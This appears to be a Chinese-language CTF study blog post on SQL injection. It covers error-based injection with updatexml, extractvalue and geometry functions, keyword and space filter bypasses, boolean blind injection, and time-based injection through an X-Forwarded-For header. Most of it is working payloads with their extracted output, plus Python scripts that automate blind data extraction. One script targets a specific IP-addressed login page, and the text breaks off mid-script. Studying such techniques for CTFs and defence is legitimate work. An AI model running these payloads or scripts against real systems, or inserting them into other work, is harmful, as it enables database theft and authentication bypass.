<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">' or updatexml(1,concat(0x7e,(version())),0) or'</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'1'' and password='</span>   <span class="keyword">or</span> <span class="string">'1  '</span>;</span><br><span class="line"></span><br><span class="line">id=1 and updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'1'</span> <span class="keyword">and</span> updatexml<span class="comment">/*' and password='*/</span>(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username=<span class="number">1</span>  <span class="string">' and updatexml/*  &amp;password=   */(1,concat(0x7e,(SELECT database()),0x7e),1) or '</span><span class="number">1</span>     <span class="comment">/* */</span>注释掉<span class="keyword">password</span></span><br><span class="line">&lt;br&gt;XPATH syntax <span class="keyword">error</span>: <span class="string">'~error_based_hpf~'</span></span><br><span class="line"></span><br><span class="line">username=<span class="number">1</span>  <span class="string">' and updatexml/*  &amp;password=   */(1,concat(0x7e,(SELECT group_concat(table_name) from information_schema.tables where !(table_schema&lt;&gt;'</span>error_based_hpf<span class="string">') ),0x7e),3)or'</span><span class="number">1</span>     当过滤掉=时用!(table_schema&lt;&gt;<span class="string">'sth'</span>)</span><br><span class="line">&lt;br&gt;XPATH syntax <span class="keyword">error</span>: <span class="string">'~ffll44jj,users~'</span></span><br><span class="line"></span><br><span class="line">username=<span class="number">1</span>  <span class="string">' and updatexml/*  &amp;password=   */(1,concat(0x7e,(SELECT group_concat(column_name) from information_schema.columns where !(table_name&lt;&gt;'</span>ffll44jj<span class="string">') ),0x7e),3)or'</span><span class="number">1</span></span><br><span class="line">&lt;br&gt;XPATH syntax <span class="keyword">error</span>: <span class="string">'~value~'</span></span><br><span class="line"></span><br><span class="line">username=<span class="number">1</span>  <span class="string">' and updatexml/*  &amp;password=   */(1,concat(0x7e,(SELECT value from ffll44jj),0x7e),3)or'</span><span class="number">1</span></span><br><span class="line">&lt;br&gt;XPATH syntax <span class="keyword">error</span>: <span class="string">'~flag&#123;err0r_b4sed_sqli_+_hpf&#125;~'</span></span><br></pre></td></tr></table></figure>

<p>过滤了and union 与空格     首先肯定不能用union联合注入了   然后尝试报错盲注  使用^来代替and</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">admin'^updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">#     使用^来代替and</span></span><br><span class="line"><span class="keyword">admin</span><span class="string">'^updatexml(1,concat(0x7e，(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()),0x7e),1) #  每间隔一个完整的单词就要用括号括一个</span></span><br><span class="line"><span class="string">admin'</span>^updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,</span><br><span class="line">(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">"H4rDsq1"</span>)),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">#</span></span><br><span class="line"><span class="keyword">admin</span><span class="string">'^updatexml(1,concat(0x7e,</span></span><br><span class="line"><span class="string">(select(group_concat(password))from(H4rDsq1)),0x7e),1)#</span></span><br></pre></td></tr></table></figure>

<p>updatexml方法 暴力破解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sername&#x3D;%00&#39; and updatexml(1,substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,41),1) #</span><br><span class="line"></span><br><span class="line">sername&#x3D;%00&#39; and updatexml(1,substr((select flag from flag),1,41),1) #</span><br></pre></td></tr></table></figure>

<h4 id="EXTRACTVALUE"><a href="#EXTRACTVALUE" class="headerlink" title="EXTRACTVALUE"></a>EXTRACTVALUE</h4><p>(XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，<br>文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串).<br>作用：从目标XML中返回包含所查询值的字符串</p>
<p><code>and extractvalue(1, payload)</code><br><code>and extractvalue(1, concat(0x7e,(select @@version),0x7e))</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(&#39;string&#39;) ord(&#39;string&#39;) 获得字符串第一个字符的ASCII码 char(ascii) 返回ASCII指向的字符</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ascii(mid(&#39;string&#39;from(n))) 这样就可以，每次取第一个字符的ASCII码</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex(&#39;string&#39;) unhex(&#39;hex&#39;) 十六进制操作，注意没有0x bin()</span><br></pre></td></tr></table></figure>

<ul>
<li><code>select 0x.........</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">left(&#39;string&#39;,n) right(&#39;string&#39;,n) &#x2F;&#x2F;从左边（右边）开始截取n个字符</span><br><span class="line">mid(&#39;string&#39;,start[,length]) substr(&#39;string&#39;,start[,length]) &#x2F;&#x2F;截取字符串，位置从1开始</span><br></pre></td></tr></table></figure>

<ul>
<li>当逗号被过滤时：<code>mid(&#39;string&#39; from start for lenth)</code></li>
<li>当空格和for被过滤时：<code>mid((&#39;string&#39;)from(start)) EG:mid((&#39;string&#39;)from(3)) =&gt;ring</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lpad(&#39;str&#39;,length,pad) rpad() 填充字符串，当mid() substr()被过滤时使用</span><br></pre></td></tr></table></figure>

<ul>
<li>意思是：在 str 左边填充 pad，字符串总长度长度为 length。EG：<code>lpad(&#39;string&#39;,10,&#39;1&#39;) =&gt; 111111root</code></li>
<li>利用： <code>lpad(&#39;string&#39;,1,1)</code> =&gt; s</li>
</ul>
<ul>
<li><code>select 1-a(); 当前库名</code></li>
</ul>
<table>
<thead>
<tr>
<th>1.floor()select * from test where id=1 and (select 1 from (select  count(<em>),concat(user(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928204840594-1429421338.png" alt="img">)2.extractvalue()select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205421297-407989251.png" alt="img">)3.updatexml()select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205451969-1920882857.png" alt="img">)4.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205719485-521701933.png" alt="img">)5.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205942266-563740245.png" alt="img">)6.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205828281-760176387.png" alt="img">)7.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210038094-1420034123.png" alt="img">)8.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210144438-1099086559.png" alt="img">)9.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210420750-344279412.png" alt="img">)10.exp()select * from test where id=1 and exp(~(select * from(select user())a));<img src="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210533313-2028104812.png" alt="img"></th>
</tr>
</thead>
<tbody><tr>
<td></td>
</tr>
</tbody></table>
<h4 id="mssql报错注入"><a href="#mssql报错注入" class="headerlink" title="mssql报错注入"></a>mssql报错注入</h4><p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/clip_image002-1595815350664.jpg" alt="img"></p>
<h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注</span><br><span class="line"></span><br><span class="line">猜解数据库名长度</span><br><span class="line">?id=1'and length(database())=8<span class="comment">--+   看一下数据库名长度  如果正确页面有回显 =7就回显为空白   </span></span><br><span class="line">猜解数据库名的值</span><br><span class="line">?id=1'and left(database(),1)='s'<span class="comment">--+数据库名第一位是否为s</span></span><br><span class="line">or  ASCII 二分法 </span><br><span class="line">?id=1’ and ascii(substr(database(),1,1))&gt;97 # </span><br><span class="line">一个个找，然后就能够猜出完整的库名 dvwa</span><br><span class="line"></span><br><span class="line">?id=1'and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span><span class="comment">--+  爆表名，第一位ascii作比较</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;80--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆破当前表名</span></span><br><span class="line"><span class="string">首先猜测表的数量 </span></span><br><span class="line"><span class="string">输入 </span></span><br><span class="line"><span class="string">1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=1 # </span></span><br><span class="line"><span class="string">然后挨个试，发现《替换 = 1 中的 1 为 1,2,3,4,5，…》2 可行。 </span></span><br><span class="line"><span class="string">接下来猜表名的长度</span></span><br><span class="line"><span class="string">1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # </span></span><br><span class="line"><span class="string">替换 = 1 中的 1 为 1,2,3,4,5,… 发现 9 可行。 </span></span><br><span class="line"><span class="string">所以长度是 9 </span></span><br><span class="line"><span class="string">1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # </span></span><br><span class="line"><span class="string">又到了 ASCII 二分环节，然后找到了第一个表名 gusetbook </span></span><br><span class="line"><span class="string">之后把 limit 后面的那个 1 换成 2 ，再来一遍，找到第二个表名 users </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆破字段数：根据指定数据库 - 数据表，尝试猜测表中的字段个数，当 [猜测值 = 实际值] 时，页面会正常显示内容；当 [猜测值≠实际值] 时，页面会返回为空记录 or 语法错误的提示</span></span><br><span class="line"><span class="string">1'</span> <span class="keyword">having</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> table_schema=<span class="string">'dvwa'</span> <span class="keyword">and</span> table_name=<span class="string">'users'</span>)=[字段数] <span class="comment">#</span></span><br><span class="line">首先猜解表中字段的数量 </span><br><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’)=<span class="number">1</span> <span class="comment"># </span></span><br><span class="line">一个个试，发现 <span class="number">8</span> 存在 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">接着挨个猜解字段名长度 </span><br><span class="line"><span class="number">1</span>’ <span class="keyword">and</span> <span class="keyword">length</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name= ’<span class="keyword">users</span>’ <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span> <span class="comment"># </span></span><br><span class="line">一个个试发现有 <span class="number">7</span> 个字符串长度。</span><br><span class="line"><span class="keyword">ASCII</span> 二分环节</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注脚本</span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://127.0.0.1/sqli-labs-master/Less-5/?id="</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        payload1 = <span class="string">"1' and ascii(substr((select database() limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;--+"</span>.format(i,mid)<span class="comment">#security</span></span><br><span class="line">        payload2 = <span class="string">"1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;--+"</span>.format(i,mid)<span class="comment">#emails,referers,uagents,users</span></span><br><span class="line">        payload3 = <span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),&#123;&#125;,1))&gt;&#123;&#125;--+"</span>.format(i,mid)</span><br><span class="line">        <span class="comment"># emails:id,email_id ,referers:id,referer,ip_address,uagents:id,uagent,ip_address,username ,users:id,username,password,username,passwd,sex,age,email,phone,id</span></span><br><span class="line">        payload4 = <span class="string">"1' and ascii(substr((select group_concat(username) from security.users),&#123;&#125;,1))&gt;&#123;&#125;--+"</span>.format(i,mid)</span><br><span class="line">        r = requests.get(url=url+payload4</span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:    <span class="comment">#语句正确与否两个回显是不一样的   You are in</span></span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    <span class="comment"># print(low,mid,high)</span></span><br><span class="line">    flag += chr(low)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162612769.png" alt="image-20200724162612769"></p>
<p><img src="https://bkimg.cdn.bcebos.com/pic/e850352ac65c103880a07b53bc119313b17e8941?x-bce-process=image/watermark,image_d2F0ZXIvYmFpa2UxMTY=,g_7,xp_5,yp_5" alt="img"></p>
<h4 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h4><p><a href="http://218.197.154.9:10011/login.php#" target="_blank" rel="noopener">http://218.197.154.9:10011/login.php#</a></p>
<p>有回显 但回显的是查询的sql语句 页面上没有回显位 是盲注</p>
<p>第一步观察到 输入万能密码admin’ oorr 1=1#或admin’# 回显为</p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726094605905.png" alt="image-20200726094605905"></p>
<p>错误输入则回显为</p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726094636368.png" alt="image-20200726094636368"></p>
<p>两个不一样的回显 想到 盲注类型会给两个回显 可以作为跑脚本的判断条件</p>
<p>第二部观察到F12中登录页面和弹窗是返回在同一个php中的</p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726094827654.png" alt="image-20200726094827654"></p>
<p>然后找到注入点username框和方法使用盲注之后 要进行fuzz测试 看一下waf过滤了哪些sql注入的关键词  看看双写绕过了哪些 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># Author peguin</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://218.197.154.9:10011/login.php"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>:<span class="string">'keep-alive'</span></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_,&#123;&#125;!@#$%^&amp;*()?~'</span>:</span><br><span class="line">        <span class="comment"># passwd = "1' oorr ascii(substr((selselectect database()),&#123;&#125;,1))=&#123;&#125;#".format(i,ord(j))#easy_sql1</span></span><br><span class="line">        passwd = <span class="string">"1' oorr ascii(substr((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))=&#123;&#125;#"</span>.format(i,ord(j))<span class="comment">#f1ag_y0u_wi1l_n3ver_kn0w,users</span></span><br><span class="line">        <span class="comment">#passwd = "1' oorr ascii(substr((selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='f1ag_y0u_wi1l_n3ver_kn0w'),&#123;&#125;,1))=&#123;&#125;#".format(i, ord(j))#f111114g</span></span><br><span class="line">        <span class="comment"># passwd = "1' oorr ascii(substr((seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w),&#123;&#125;,1))=&#123;&#125;#".format(i, ord(j))</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'user'</span>:passwd,</span><br><span class="line">            <span class="string">'pass'</span>:<span class="string">'123'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(passwd)</span></span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Login success!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += j</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h4 id="例子2-过滤-“-”-和空格"><a href="#例子2-过滤-“-”-和空格" class="headerlink" title="例子2 过滤 “,” 和空格"></a>例子2 过滤 “,” 和空格</h4><p>首先划重点，payload 的基本格式为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;12&#39;%(ascii(mid(user()from(-1)))&gt;101)%&#39;1&amp;passwd&#x3D;dddd</span><br></pre></td></tr></table></figure>

<p>数据库构造的 sql 语句为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE uname&#x3D;&#39;12&#39;%(ascii(mid((passwd)from(-1)))&gt;101)%&#39;1&#39;</span><br></pre></td></tr></table></figure>

<p>很奇怪，这条 sql 竟然执行了，下面详细分析这个神奇的 payload 的构成：<br> 首先分析 (ascii(mid((passwd)from(-1)))&gt;101) 这部分：<br> 从最里面看， passwd 是表中的字段名，然后是 mid((passwd)from(-1)) 这部分，<br> 首先说 mid 函数，用执行结果做解释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mid(&quot;abcdef&quot;,2,3)&#x3D;&quot;bcd&quot;</span><br><span class="line">mid(&quot;abcdef&quot;,2)&#x3D;&quot;bcdef&quot;</span><br><span class="line">mid(&quot;abcdef&quot;,-2)&#x3D;&quot;ef&quot;</span><br></pre></td></tr></table></figure>

<p>mid((passwd)from(-1)) 等价于 mid(passwd,-1), 即取 passwd 的最后一个字符，比如 passwd 的值为 “password”,mid((passwd)from(-1)) 的值即为’d’，mid((passwd)from(-2)) 的值即为’rd’，依次类推。<br> ascii(‘b’) 函数为’b’ 的 ascii 码的十进制值，ascii(‘ab’) 函数为’a’ 的 ascii 码的十进制值，即返回第一个字符的 ascii 码值，因此 (ascii(mid((passwd)from(-1)))&gt;101) 这部分，根据返回值是 true 或者 false, 可以判断最后一个字符的范围，通过修改 - 1 的值，来对 passwd 中的字符从后向前进行遍历判断，与其他 bool 注入相似.</p>
<p>接下来分析 <code>uname=&#39;12&#39;%(something)%&#39;1&#39;</code> 这部分，mysql 中，<code>true</code> 的值为 1，<code>false</code> 的值为 0, 因此 uname 的值可能为<code>&#39;12&#39;%1%&#39;1&#39;</code> 或者<code>&#39;12&#39;%0%&#39;1&#39;</code>，这里面 <code>%</code> 为取余运算，运算顺序从左到右，<code>&#39;12&#39;%0%&#39;1&#39;</code> 即 <code>(&#39;12&#39;%0)%&#39;1&#39;</code>，首先计算<code>&#39;12&#39;%0</code>, 计算时会将<code>&#39;12&#39;</code> 转换为数字，mysql 字符串转换为数字的过程与 php 相同，举例说明:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;1abcd&#39;&#x3D;1</span><br><span class="line">&#39;abcd&#39;&#x3D;0,即任意以非零开头的字符串与0相等</span><br></pre></td></tr></table></figure>

<p>因此<br> <code>(&#39;12&#39;%0)%&#39;1&#39;</code>=&gt; <code>(1%0)%1</code>=&gt;null<br> <code>(&#39;12&#39;%1)%&#39;1&#39;</code>=&gt; <code>(1%1)%1</code>=&gt;0<br> 当结果为 null 时，sql 语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE uname&#x3D;null</span><br></pre></td></tr></table></figure>

<p>查询结果为空，当结果为 0 时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE uname&#x3D;0</span><br></pre></td></tr></table></figure>

<p>前面说了，0 与任何字符串的值相等，因此查询返回全部用户，即查询结果不为空.</p>
<h4 id="例子3-from-1-for-1的形式"><a href="#例子3-from-1-for-1的形式" class="headerlink" title="例子3 from 1 for  1的形式"></a>例子3 from 1 for  1的形式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substring((<span class="keyword">select</span> <span class="keyword">user</span>()) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)=<span class="string">'e'</span></span><br><span class="line"><span class="keyword">substring</span>((<span class="keyword">select</span>  <span class="keyword">user</span>()) <span class="keyword">from</span> <span class="number">-1</span>)=<span class="string">'t'</span></span><br></pre></td></tr></table></figure>

<p>爆破user()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-forwarded-for: 10.20.0.12&#39;+sleep(5) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p>pay找到两种 load就是写个脚本跑了：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> client_ip (ip) <span class="keyword">values</span> (<span class="string">'ip'</span>+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">substring</span>((<span class="keyword">select</span> <span class="keyword">user</span>()) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)=<span class="string">'e'</span>) <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">3</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)); <span class="comment">--第一种payload</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> client_ip (ip) <span class="keyword">values</span> (<span class="string">'ip'</span>+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">substring</span>((<span class="keyword">select</span> <span class="keyword">user</span>()) <span class="keyword">from</span> <span class="number">-1</span>)=<span class="string">'t'</span>) <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">3</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)); <span class="comment">--第二种payload</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">maystr=<span class="string">"0987654321qwertyuiopasdfghjklzxcvbnm"</span></span><br><span class="line">url=<span class="string">"http://127.0.0.1/sql/sql.php"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">   <span class="keyword">for</span> str <span class="keyword">in</span> maystr:</span><br><span class="line">     headers=&#123;<span class="string">"x-forwarded-for"</span>:<span class="string">"127.0.0.1'+"</span>+<span class="string">"(select case when (substring((select flag from flag ) from %d for 1 )='%s') then sleep(6) else sleep(0) end ) and '1'='1"</span>%(i+<span class="number">1</span>,str)&#125;   <span class="comment">#%d  %s   %(i+1,str)  可以用format的形式：&#123;&#125; &#123;&#125;  .format(i+1,str)</span></span><br><span class="line"> <span class="comment"># proxy=&#123;"http":"http://127.0.0.1:8080"&#125;</span></span><br><span class="line"> <span class="comment"># res=requests.get(url,headers=headers,timeout=3)</span></span><br><span class="line">     <span class="keyword">try</span>: </span><br><span class="line">         res=requests.get(url,headers=headers,timeout=<span class="number">4</span>)</span><br><span class="line">     <span class="keyword">except</span> requests.exceptions.ReadTimeout,e:</span><br><span 